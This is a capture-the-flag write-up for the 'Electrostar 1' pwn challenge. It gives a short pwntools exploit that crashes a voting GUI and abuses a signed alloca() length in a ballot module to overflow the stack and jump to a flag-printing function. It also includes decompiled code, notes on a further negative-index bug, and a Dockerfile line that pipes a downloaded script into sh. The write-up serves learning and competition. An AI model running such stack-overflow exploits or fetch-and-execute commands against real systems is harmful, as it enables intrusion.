# Electrostar 1

author: itszn

Electrostar(TM) is a new secure modular userspace system which provides security for the upcoming election. We want you to try and find a weakness in the system and slowly work your way in. Our goal is complete compromise!

This challenge is running on Ubuntu 18.04 with the provided libc.

Hint: For the first flag, focus on the `ballot_module.img.sig` and `gui_module.img.sig`

[handout](https://htv2020.s3.amazonaws.com/electrostar.tar.gz)

server: `electrostar.hackthe.vote:9000`

## TL;DR

* Crash the `ncurses` GUI to drop in to the `stdin` interface of `ballot_module`
* the first byte sent will be passed to `alloca()`. Send a negative byte to allow for BOF
* jump to `print_flag()` func inside `ballot_module`.

The exploit code is short enough to be dumped here:

```python
from pwn import *
r = remote('54.144.21.40', 9000)
DOWN = '\x1b\x4f\x42'
r.recvrepeat(timeout=3)
r.sendline(DOWN) # go down and select vote
r.sendline()     # unselect that vote
r.sendline(DOWN) # go down and send the vote

PRINT_FLAG = 0x500741	# grab from gdb
END_OF_WARN = b'\x1b\x5b\x30\x6d' # colour code that is used by output
r.recvuntil(b'falling back to STDIN'+END_OF_WARN+b'\n') # not necessary, but for documentation
# in-between p8() and PRINT_FLAG, one variable needs to be zeroed out [p64(0)] to prevent a for() loop from executing.
r.sendline(p8(256-15) + b'a'*0x18 + p64(0).ljust(0x40) + pack(PRINT_FLAG))
r.interactive()
```

## machine

```
$ tree electrostar
├── connect.sh
├── flag1.txt
├── flag2.txt
├── flag3.exe
├── libc.so.6
├── machine
├── modules
│   ├── ballot_module.img.sig
│   ├── gui_module.img.sig
│   ├── init_module.img.sig
├── README.txt
├── sandbox.h
└── serve.sh
$ cat electrostar/connect.sh
socat tcp:54.144.21.40:9000 FILE:`tty`,rawer,echo=0,icrnl=1,escape=0x03
$ cat electrostar/serve.sh
/usr/bin/socat -d -d TCP-LISTEN:9000,reuseaddr,fork EXEC:"timeout -sKILL 300 ./machine modules/init_module.img.sig",pty,stderr,setsid,sigint,sighup,echo=0,sane,raw,ignbrk=1
```

The server runs `./machine modules/init_module.img.sig`; the reversibles are `./machine`, and the 3 `*.sig`s in `modules/`.

Although the challenge description recommends looking closely at `gui_module.img.sig` and `ballot_module.img.sig`, that's probably not where you should start for this.

The first step for any CTF is to look for _how to get the flag_, and for that, there's a chunk of code in `machine` that every solution used:

```
//process_ipc+331
if ( ipc_option == 1337 ) { // this variable is self-labelled
  stream = fopen("flag1.txt", "r"); //find this part by grepping "flag1.txt"
  fgets(&s, 64, stream);
  fclose(stream);
  printf("\x1B[92m[Module %u] Here is your flag #1: %s\n\x1B[0m", (unsigned int)proc->parent_pid, &s); //proc is a self-labelled struct
}
```

I'm not going to dig into the whole "IPC" thing this write-up; just remember and bookkeep the number 1337.

To begin the challenge, I tried running the binary as intended:

```
$ ./machine  modules/init_module.img.sig
0x7ff3cc7d5000
   ______        __           ______
  / __/ /__ ____/ /________  / __/ /____ _____
 / _// / -_) __/ __/ __/ _ \_\ \/ __/ _ `/ __/
/___/_/\__/\__/\__/_/  \___/___/\__/\_,_/_/   (tm)
Electrionic Balloting System
Copyright 2011

Booting Primary Module
Module hash:
b8da219ba88c5a1fb98b3fd0dc9d7d7514edd51f2696248949e7aa12b5487bb6
Checking Module Signature:
303c021c1739c89093497fa996bacfc05878eebd778ef58b84fe4f676e44c6cd
021c42419d590420e6f6a0066d53bedd7bb4ec09193c536ec91910cbb22f0000
Image Signature Validated
DEBUG: Image Size = 8233 bytes
[Module 1240652] Started Module Load
DEBUG: Module mapped to 0x500000
[Module 1240652] Scrubbing process for security
[Module 1240652] [Init] Started Init Module
[Module 1240652] [Init] Starting GUI Module...
WARN: Module 1240652 Exited
ERROR: Init exited, exiting...
```

Well that didn't work. After a few hours of investigation, I decide to scramble together a Dockerfile to get things working properly:

```dockerfile
from ubuntu:18.04

run apt-get update && apt-get upgrade -y
run apt-get install -y socat libncurses5 libncurses5-dev gdb-multiarch

copy ./machine ./connect.sh ./local.sh modules/ README.txt sandbox.h ./serve.sh ./flag1.txt ./flag2.txt ./flag3.exe /chall/

WORKDIR /chall
run chmod 777 /chall/* # lazyness

# stuff for local debugging
run apt-get install -y wget
run sh -c "$(wget http://gef.blah.cat/sh -O -)"
run echo 'set step-mode on' >> ~/.gdbinit
run apt-get install -y python3-pip python3.8 python3.8-dev
run python3.8 -m pip install pwntools

CMD /chall/serve.sh
```

Build with `docker build -t electrostar .`; run with `docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined electrostar`, get inside with `docker exec -it $(docker ps|head -2|tail -1|grep '^[0-9a-z]*' -o) bash`.

Now that we've got a working binary, we can go on to do the actual challenge.

## Voting

```
    ┌─┐
    │                                      │
    │                                      │
    │ * President: Washington              │
    │   President: Lincoln                 │
    │   Submit                             │
    │                                      │
    │                                      │
    │                                      │
    └─┘
```

The program has a very simple menu: 3 options, you press enter to select any of them, and arrow keys to navigate.

There are two interesting features you can get from fiddling around with the menu:

1. You can choose to vote for both candidates (unfortunately, this seems to do little useful)

2. Normally, you can't vote without choosing a candidate first. However, if you select and unselect a candidate, you can press the submit button for an interesting outcome:

   ```
   Starting GUI module, supressing log output
   GUI Process Crashed with Floating point exception
   WARN: Module 3420 Exited
   WARN: GUI lost, resuming log output
   WARN: No GUI process, falling back to STDIN
   ```

Why does this happen? Decompilation is a slow way to gain understanding.

Starting off with `gui_module.img.sig`, we'll try to open up the innards with IDA:

```python
seg000:0000000000000000                 dq 51D6141C023D303Fh, 0C45F9B4260063F45h, 92C6DBA4220FDB70h
seg000:0000000000000000                 dq 6088E1091EA5FF39h, 0D2AE53E1001D02AAh, 0CA1DD9B9EEA0F7ECh
seg000:0000000000000000                 dq 0E5DBAA7E74D278B5h, 6D0547388DAC642Eh, 0A74058D4802h
seg000:0000000000000000                 dq 0CCCCCCCCCCCCE0FFh, 54h dup(0CCCCCCCCCCCCCCCCh), 1D68058D48CCCCh
seg000:0000000000000000                 dq 0FFFFFFFFF3E8C300h, 60FFFFFFFFECE820h, 60FFFFFFFFE4E808h
...
```

That's pretty terrible, but the numbers looked close enough to code for me to play around with the disassembler a bit more.

Undefining things with `u` and pressing `c` enough times randomly will eventually bring you a list of proper functions:

```
sub_2F2	seg000	00000000000002F2	00000008	00000000	00000000	R	.	.	.	.	.	.
sub_301	seg000	0000000000000301	00000008			R	.	.	.	.	.	.
sub_311	seg000	0000000000000311	00000008			R	.	.	.	.	.	.
sub_321	seg000	0000000000000321	00000008			R	.	.	.	.	.	.
sub_329	seg000	0000000000000329	00000008			R	.	.	.	.	.	.
sub_331	seg000	0000000000000331	00000008			R	.	.	.	.	.	.
sub_339	seg000	0000000000000339	00000008			R	.	.	.	.	.	.
sub_341	seg000	0000000000000341	00000008			R	.	.	.	.	.	.
sub_349	seg000	0000000000000349	00000008			R	.	.	.	.	.	.
sub_351	seg000	0000000000000351	00000008			R	.	.	.	.	.	.
sub_359	seg000	0000000000000359	00000008			R	.	.	.	.	.	.
sub_361	seg000	0000000000000361	00000008			R	.	.	.	.	.	.
sub_369	seg000	0000000000000369	00000008			R	.	.	.	.	.	.
sub_371	seg000	0000000000000371	00000008			R	.	.	.	.	.	.
sub_379	seg000	0000000000000379	0000000B			R	.	.	.	.	.	.
sub_384	seg000	0000000000000384	0000000B			R	.	.	.	.	.	.
sub_38F	seg000	000000000000038F	0000000B			R	.	.	.	.	.	.
sub_39A	seg000	000000000000039A	0000000B			R	.	.	.	.	.	.
sub_3A5	seg000	00000000000003A5	0000000B			R	.	.	.	.	.	.
sub_3B0	seg000	00000000000003B0	0000000B			R	.	.	.	.	.	.
sub_3BB	seg000	00000000000003BB	0000000B			R	.	.	.	.	.	.
sub_3C6	seg000	00000000000003C6	0000000B			R	.	.	.	.	.	.
sub_3D1	seg000	00000000000003D1	0000039C	00000038	00000000	R	.	.	.	B	.	.
sub_76D	seg000	000000000000076D	0000008B	00000018	00000000	R	.	.	.	B	.	.
sub_7F8	seg000	00000000000007F8	0000002A	00000018	00000000	R	.	.	.	B	.	.
sub_84E	seg000	000000000000084E	0000026E	00000088	00000000	R	.	.	.	B	.	.

```

If you stare at the code longer, you'll eventually realise that most of these functions are actually just acting like a GOT table, with the actual library function names all embedded in the binary. The remaining functions can be named by intuition:

```
grab_GOT_table	seg000	00000000000002F2	00000008	00000000	00000000	R	.	.	.	.	.	.
printf	seg000	00000000000002FA	00000007			R	.	.	.	.	.	.
write	seg000	0000000000000301	00000008			R	.	.	.	.	T	.
read	seg000	0000000000000309	00000008			R	.	.	.	.	.	.
strlen	seg000	0000000000000311	00000008			R	.	.	.	.	.	.
endwin	seg000	0000000000000319	00000008			R	.	.	.	.	.	.
getch	seg000	0000000000000321	00000008			R	.	.	.	.	.	.
refresh	seg000	0000000000000329	00000008			R	.	.	.	.	.	.
new_item	seg000	0000000000000331	00000008			R	.	.	.	.	T	.
new_menu	seg000	0000000000000339	00000008			R	.	.	.	.	.	.
post_menu	seg000	0000000000000341	00000008			R	.	.	.	.	.	.
menu_driver	seg000	0000000000000349	00000008			R	.	.	.	.	.	.
menu_opts_off	seg000	0000000000000351	00000008			R	.	.	.	.	.	.
current_item	seg000	0000000000000359	00000008			R	.	.	.	.	.	.
item_index	seg000	0000000000000361	00000008			R	.	.	.	.	.	.
item_value	seg000	0000000000000369	00000008			R	.	.	.	.	.	.
newwin	seg000	0000000000000371	00000008			R	.	.	.	.	.	.
keypad	seg000	0000000000000379	0000000B			R	.	.	.	.	.	.
set_menu_win	seg000	0000000000000384	0000000B			R	.	.	.	.	.	.
set_menu_sub	seg000	000000000000038F	0000000B			R	.	.	.	.	.	.
derwin	seg000	000000000000039A	0000000B			R	.	.	.	.	.	.
set_menu_mark	seg000	00000000000003A5	0000000B			R	.	.	.	.	.	.
wrefresh	seg000	00000000000003B0	0000000B			R	.	.	.	.	.	.
box	seg000	00000000000003BB	0000000B			R	.	.	.	.	.	.
unpost_menu	seg000	00000000000003C6	0000000B			R	.	.	.	.	.	.
load_externs_return_extern_table	seg000	00000000000003D1	0000039C	00000038	00000000	R	.	.	.	B	.	.
multiref_func	seg000	000000000000076D	0000008B	00000018	00000000	R	.	.	.	B	T	.
NO_xref_function_continued	seg000	00000000000007F8	0000002A	00000018	00000000	R	.	.	.	B	.	.
NO_xref_function	seg000	0000000000000822	0000002C	00000018	00000000	R	.	.	.	B	.	.
run_voting_ui	seg000	000000000000084E	0000026E	00000088	00000000	R	.	.	.	B	.	.
main_probably	seg000	0000000000000ABC	00000071	00000038	00000000	.	.	.	.	B	T	.
```

In what is _probably_ `main()`, there is a simple loop that runs the voting GUI:

```c
int main(){
  char *saved_rax; // [rsp+28h] [rbp-8h]

  load_GOT_table(a3, a4);
  saved_rax = (char *)newwin(10LL, 40LL);
  keypad(saved_rax, 1LL);
  while ( 1 )
    run_voting_ui(saved_rax, (char *)&unk_1);
}
```

In `run_voting_ui()`, you can find the main programming loop that drives the ncurses UI:

```c
nothing_has_been_selected = 1;  
while ( 1 )
  {
    wrefresh(v7);
    c = getch(v7);
    if ( c == -1 )
      break;
    switch ( c )
    {
      case '\x01\x02':
        menu_driver();
        break;
      case '\x01\x03':
        menu_driver();
        break;
      case '\n':
      case '\r':
        v18 = current_item(v20);
        ind = item_index();
        if ( ind == 2 )
        {
          if ( !nothing_has_been_selected )
            goto LABEL_13;
        }
        else
        {
          nothing_has_been_selected = 0;
          menu_driver();
        }
        break;
    }
  }
LABEL_13:
```

The verbose `nothing_has_been_selected` is the source of the `GUI Process Crash` we saw earlier. If the program jumps to `LABEL_13` without any selected vote, the program will attempt to do a division by zero, which causes the crash.

If the vote *doesn't* crash, a log of the vote is written to some weird file descriptor that comes with the process:

```c
// run_voting_ui calls multiref_func(10, (char *)a2a, 32);
__int64 multiref_func(int type, char *buf, __int16 len)
{
  unsigned __int16 len2; // [rsp+8h] [rbp-8h]
  int fd2; // [rsp+Ch] [rbp-4h]

  fd2 = type;
  len2 = len + 4;
  write(*(_DWORD *)(unk_2041 + 12LL), (__int64)&len2, 2);
  write(*(_DWORD *)(unk_2041 + 12LL), (__int64)&fd2, 4);
  return write(*(_DWORD *)(unk_2041 + 12LL), (__int64)buf, (unsigned int)len2 - 4);
}
```

Through some divine magic, you can eventually find out that `multiref_func` is sending this data to `ballot_module` via the `i/o` methods defined in `machine`. Although there's a lot more to see in `gui_module.img.sig`, **everything else inside is useless** for the purposes of our exploit, so we'll move on to `ballot_module`.

## Stdin

```
while ( 1 ){
  idk_print("Waiting for input from GUI...\n");
  input = (char *)recv_input(100);
  parse_input(input);
  free(input);
}
```

`Ballot module` works like this:

* In `recv_input()`, take the first two bytes of input to be the _message length_, and return an allocated pointer to the rest of the message:

  ```c
  __int64 recv_input_change_len(_WORD *len){
    __int64 recv_ptr; // ST18_8
  
    *len = 0;
    read(*(unsigned int *)(envp_place + 16LL), len, 2LL); // msg len
    if ( !len )
      return 0LL;
    recv_ptr = malloc((unsigned __int16)*len);
    read(*(unsigned int *)(envp_place + 16LL), recv_ptr, (unsigned __int16)*len);
    return recv_ptr; //msg received
  }
  ```

  We can ignore the first two bytes --- `process_ipc` in `./machine` handles that stuff on its own, and our input is effectively whatever appears inside `recv_ptr`.

* In `parse_input()`, use the first byte _of that allocated message_ as a length to be passed to `alloca()`, and then run `memcpy()` from the allocated message to `rsp`:

  ```c
  __int64 __fastcall parse_input(char *input)
  {
    void *rsp_; // rsp
    signed __int64 expected_len; // rax
    __int64 result; // rax
    __int64 new_rsp_deref; // [rsp+0h] [rbp-50h]
    char *input_copy; // [rsp+8h] [rbp-48h]
    unsigned __int64 v6; // [rsp+18h] [rbp-38h]
    __int64 *rsp_copy; // [rsp+20h] [rbp-30h]
    __int64 x64_first_byte_minus_one; // [rsp+28h] [rbp-28h]
    unsigned __int8 input_first_bytes; // [rsp+36h] [rbp-1Ah]
    unsigned __int8 v10; // [rsp+37h] [rbp-19h]
    unsigned __int64 i; // [rsp+38h] [rbp-18h]
  
    input_copy = input;
    input_first_bytes = *input;
    x64_first_byte_minus_one = (char)input_first_bytes - 1LL;
    rsp_ = alloca(16 * (((char)input_first_bytes + 15LL) / 0x10uLL));// sign extension issue here
    rsp_copy = &new_rsp_deref;
    if ( input_first_bytes > 0x63u )
      expected_len = 100LL;
    else
      expected_len = (unsigned int)(char)input_first_bytes;
    v6 = expected_len;
    memcpy(rsp_copy, input_copy + 1, expected_len, input_copy + 1, (char)input_first_bytes, 0LL); // can BOF with this
    v10 = 0;
    for ( i = 0LL; i < v6; ++i )
    {
      if ( *((char *)rsp_copy + i) > (unsigned int)v10 )
        v10 = *((_BYTE *)rsp_copy + i);
    }
    // this part can be used for shellcoding, but honestly why bother?
    ++*(_DWORD *)byte_2040;
    result = byte_2040[0];
    byte_2060[byte_2040[0]] = v10;
    return result;
  }
  ```

By setting the first byte to be `-15`, `alloca()` will allocate 0 bytes of memory, but `expected_len` will still be set to `100` because of unsigned comparison. To control RIP, we'll fake an input like this:

```
+-first_byte-+-garbage-+-return_pointer-+
|    -15     |    0    |     ??????     |
+-----1------+---0x58--+-------0x8------+
```

The question of "where to jump" is easily solved by looking through the program:

```c
__int64 print_flag(){
  idk_print("Dumping Flag!\n");
  return IPC_message_with_len_and_fd(1337, 0, 0);
}
```

_There's_ the 1337. By jumping to there, you're done!

## Other notes

I couldn't solve part 2 because I had no idea how to leak the private key.

For part 3, it's maybe a _little_ bit obvious that the solution is somewhere here:

```c
if ( ipc_option == 50 ){
  if ( !(proc->type & 4) ){
    printf("\x1B[93mWARN: Only the init module can call command 50\n\x1B[0m", allocd);
    return __readfsqword(0x28u) ^ v12;
  }
  if ( sizecopy <= 0xF )
    return __readfsqword(0x28u) ^ v12;
  v9 = *(_DWORD *)&allocd_copy->msg; // v9 is a signed int
  if ( v9 > 31 ){  // let's be real here: this is probably a negative index bug
    printf("\x1B[93mWARN: Command 50 out of bounds!\n\x1B[0m", allocd);
    return __readfsqword(0x28u) ^ v12;
  }
  record_array[v9] = *(_QWORD *)((char *)&allocd_copy[1].type + 3); // this can index straight to FILE* for an exploit. libc leak is already implicit from the leaked pointer at the first line of output from ./machine
}
```

Alas, getting there needs a fake `proc->type & 4` module, which is rather impossible without solving part 2 first.

